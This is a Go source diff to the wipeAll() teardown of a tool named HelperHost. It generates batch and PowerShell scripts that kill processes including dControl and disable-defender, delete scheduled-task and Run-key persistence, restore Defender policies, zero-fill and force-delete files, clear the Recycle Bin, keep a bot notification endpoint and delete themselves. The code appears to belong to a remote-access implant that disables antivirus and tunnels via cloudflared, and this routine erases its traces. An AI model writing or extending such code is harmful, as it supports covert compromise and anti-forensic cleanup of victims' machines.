@@ -550,6 +550,9 @@ func wipeAll() {
 		psSnap := `
 $ErrorActionPreference='SilentlyContinue'
 $out=Join-Path $env:TEMP 'hh-wipe-state.json'
+$kit=Join-Path $env:ProgramData 'HelperHostWipe'
+New-Item -ItemType Directory -Path $kit -Force | Out-Null
+'1'|Set-Content -Encoding ASCII (Join-Path $kit 'STOP') -Force
 $o=[ordered]@{}
 try {
   $st=(Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
@@ -557,9 +560,12 @@ try {
     $j=$st|ConvertFrom-Json
     if ($j.uac_bak) { $o.uac_bak=$j.uac_bak }
     if ($j.notify_bak) { $o.notify_bak=$j.notify_bak }
+    if ($j.bot_base) { $o.bot_base=$j.bot_base }
   }
 } catch {}
+` + "if (-not $o.bot_base) { $o.bot_base='" + strings.ReplaceAll(bb, `'`, `''`) + "' }\r\n" + `
 ($o|ConvertTo-Json -Compress)|Set-Content -Encoding UTF8 $out
+if ($o.bot_base) { @{bot_base=$o.bot_base}|ConvertTo-Json -Compress|Set-Content -Encoding UTF8 (Join-Path $kit 'bot.json') -Force }
 `
 		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psSnap).Run()
 	} else {
@@ -596,8 +602,19 @@ try {
 
 	home, _ := os.UserHomeDir()
 	if runtime.GOOS == "windows" {
-		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
+		kitDir := filepath.Join(os.Getenv("ProgramData"), "HelperHostWipe")
+		_ = os.MkdirAll(kitDir, 0o755)
+		_ = os.WriteFile(filepath.Join(kitDir, "STOP"), []byte("1\r\n"), 0o644)
+		restorePS1 := filepath.Join(kitDir, "restore-win-security.ps1")
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
+		restoreTemp := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
+		_ = os.WriteFile(restoreTemp, []byte(restoreWinSecurityPS1), 0o644)
+		// Stage enable-defender into kit before HelperHost is nuked
+		enSrc := filepath.Join(dir, "enable-defender.exe")
+		enKit := filepath.Join(kitDir, "enable-defender.exe")
+		if b, err := os.ReadFile(enSrc); err == nil {
+			_ = os.WriteFile(enKit, b, 0o644)
+		}
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
 		notifyLine := ""
 		if tok != "" && bb != "" {
@@ -617,42 +634,49 @@ try {
 		}
 		dirEsc := strings.ReplaceAll(dir, `'`, `''`)
 		cacheEsc := strings.ReplaceAll(cacheDir, `'`, `''`)
+		kitEsc := strings.ReplaceAll(kitDir, `'`, `''`)
 		psElev := filepath.Join(os.TempDir(), "hh-restore-elev.ps1")
 		elevBody := "$ErrorActionPreference='SilentlyContinue'\r\n" +
 			"try{$PSNativeCommandUseErrorActionPreference=$false}catch{}\r\n" +
-			"iex ((Get-Content -Raw '" + strings.ReplaceAll(restorePS1, `'`, `''`) + "'))\r\n"
+			"& '" + strings.ReplaceAll(restorePS1, `'`, `''`) + "'\r\n"
 		_ = os.WriteFile(psElev, []byte(elevBody), 0o644)
 
 		body := "@echo off\r\n" +
 			"setlocal EnableDelayedExpansion\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"mkdir \"%ProgramData%\\HelperHostWipe\" >nul 2>&1\r\n" +
+			"echo 1> \"%ProgramData%\\HelperHostWipe\\STOP\"\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM cloudflared.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM disable-defender.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
+			// STOP EarlyAV FIRST — must never re-disable during restore
 			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostDControlOff /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHost /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
-			// pgkt04 enable-defender -s (open-source) BEFORE elev restore
+			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
+			// Stage enable-defender into durable kit
+			"if exist \"" + dir + "\\enable-defender.exe\" copy /y \"" + dir + "\\enable-defender.exe\" \"%ProgramData%\\HelperHostWipe\\enable-defender.exe\" >nul 2>&1\r\n" +
 			"if exist \"" + dir + "\\enable-defender.exe\" copy /y \"" + dir + "\\enable-defender.exe\" \"%TEMP%\\hh-enable-defender.exe\" >nul 2>&1\r\n" +
-			"if exist \"%TEMP%\\hh-enable-defender.exe\" (\r\n" +
+			"if exist \"%ProgramData%\\HelperHostWipe\\enable-defender.exe\" (\r\n" +
+			"  \"%ProgramData%\\HelperHostWipe\\enable-defender.exe\" -s\r\n" +
+			"  taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
+			") else if exist \"%TEMP%\\hh-enable-defender.exe\" (\r\n" +
 			"  \"%TEMP%\\hh-enable-defender.exe\" -s\r\n" +
 			"  taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
-			"  taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
 			")\r\n" +
-			// Recreate elevated restore with FRESH script (old task often pointed at deleted temp file)
+			// Elevated restore from ProgramData kit (survives TEMP races) — WAIT up to ~3 min
 			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
 			"schtasks /Create /TN HelperHostWipeRestore /TR \"\\\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + restorePS1 + "\\\"\" /SC ONCE /ST 00:00 /RL HIGHEST /F >nul 2>&1\r\n" +
 			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
-			"ping 127.0.0.1 -n 8 >nul\r\n" +
-			// Fallback elev (UAC still silent until restore ends)
-			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try { $p=Start-Process -FilePath powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + restorePS1 + "\\\"'; if($p){$p.WaitForExit(120000)} } catch {}\" >nul 2>&1\r\n" +
-			"ping 127.0.0.1 -n 3 >nul\r\n" +
+			"ping 127.0.0.1 -n 25 >nul\r\n" +
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try { $p=Start-Process -FilePath powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + restorePS1 + "\\\"'; if($p){$p.WaitForExit(180000)} } catch {}\" >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 5 >nul\r\n" +
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
@@ -665,15 +689,11 @@ try {
 			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM disable-defender.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
-			"del /f /q \"%TEMP%\\hh-enable-defender.exe\" >nul 2>&1\r\n" +
-			"del /f /q \"%TEMP%\\hh-dcontrol.exe\" >nul 2>&1\r\n" +
-			"del /f /q \"%TEMP%\\hh-dc-on.cmd\" >nul 2>&1\r\n" +
-			"del /f /q \"%TEMP%\\hh-dc-off.cmd\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
-			// Force-unlock + wipe HelperHost + EdgeRelay cache (retry)
+			// Force-unlock + wipe HelperHost + EdgeRelay cache (AFTER restore)
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
 			"$ErrorActionPreference='SilentlyContinue'; " +
 			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared,dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
@@ -681,8 +701,8 @@ try {
 			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av|dControl|disable-defender|enable-defender' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
 			"function Nuke-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
 			"Kill-HH; attrib -h -s /s /d \\\"$Root\\*\\\" 2>$null; attrib -h -s \\\"$Root\\\" 2>$null; " +
-			"cmd /c \\\"takeown /f `\\\"$Root`\\\" /r /d y\\\" | Out-Null; " +
-			"cmd /c \\\"icacls `\\\"$Root`\\\" /grant Everyone:F /t /c /q\\\" | Out-Null; " +
+			"cmd /c \\\"takeown /f `\\\"$Root`\\\" /r /d o\\\" | Out-Null; " +
+			"cmd /c \\\"icacls `\\\"$Root`\\\" /grant *S-1-5-32-544:F /t /c /q\\\" | Out-Null; " +
 			"Get-ChildItem -LiteralPath $Root -Recurse -Force -File -EA SilentlyContinue | ForEach-Object { " +
 			"try { $_.Attributes='Normal'; $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); $fs.SetLength(0); $fs.Close(); Remove-Item -LiteralPath $_.FullName -Force -EA SilentlyContinue } catch { " +
 			"cmd /c \\\"del /f /q `\\\"$($_.FullName)`\\\"\\\" | Out-Null } }; " +
@@ -690,27 +710,31 @@ try {
 			"if(Test-Path -LiteralPath $Root){ Remove-Item -LiteralPath $Root -Recurse -Force -EA SilentlyContinue } }; " +
 			"1..8 | ForEach-Object { Kill-HH; Nuke-Tree '" + dirEsc + "'; Nuke-Tree '" + cacheEsc + "'; " +
 			"Nuke-Tree (Join-Path $env:TEMP 'HelperHostCache'); Nuke-Tree (Join-Path $env:LOCALAPPDATA 'HelperHost'); " +
-			"Nuke-Tree (Join-Path $env:LOCALAPPDATA 'Temp\\HelperHostCache'); Start-Sleep -Seconds 1 }; " +
+			"Nuke-Tree (Join-Path $env:LOCALAPPDATA 'Temp\\HelperHostCache'); " +
+			"Nuke-Tree 'C:\\ProgramData\\defender-control'; Start-Sleep -Seconds 1 }; " +
 			"Clear-RecycleBin -Force -EA SilentlyContinue; " +
-			"Remove-Item (Join-Path $env:TEMP 'hh-wipe-state.json') -Force -EA SilentlyContinue" +
+			"Remove-Item (Join-Path $env:TEMP 'hh-wipe-state.json') -Force -EA SilentlyContinue; " +
+			"Nuke-Tree '" + kitEsc + "'" +
 			"\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"%TEMP%\\HelperHostCache\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"%LOCALAPPDATA%\\HelperHost\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"%LOCALAPPDATA%\\Temp\\HelperHostCache\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"%ProgramData%\\HelperHostWipe\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"%ProgramData%\\defender-control\" >nul 2>&1\r\n" +
 			"del /f /q \"%LOCALAPPDATA%\\HelperHost\\HelperHost.exe\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
-			"del /f /q \"%LOCALAPPDATA%\\Temp\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
-			// Extra AV policy wipe via reg (in case elev restore partially failed)
 			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
 			"reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
 			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\" /f >nul 2>&1\r\n" +
 			"gpupdate /Target:Computer /Force >nul 2>&1\r\n" +
 			"sc config WinDefend start= auto >nul 2>&1\r\n" +
+			"sc config MDCoreSvc start= auto >nul 2>&1\r\n" +
 			"net start WinDefend >nul 2>&1\r\n" +
 			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
+			"del /f /q \"" + restoreTemp + "\" >nul 2>&1\r\n" +
 			"del /f /q \"" + psElev + "\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
@@ -718,6 +742,12 @@ try {
 			"del /f /q \"%TEMP%\\hh-export-*\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-run-*\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-res-*\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-enable-defender.exe\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-dcontrol.exe\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\mpam-fe.exe\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\Procmon64.exe\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-defender-*\" >nul 2>&1\r\n" +
+			"del /f /q \"%USERPROFILE%\\Desktop\\REPARER-DEFENDER.*\" >nul 2>&1\r\n" +
 			notifyLine +
 			"del /f /q \"%TEMP%\\hh-*\" >nul 2>&1\r\n" +
 			"del \"%~f0\" >nul 2>&1\r\n"
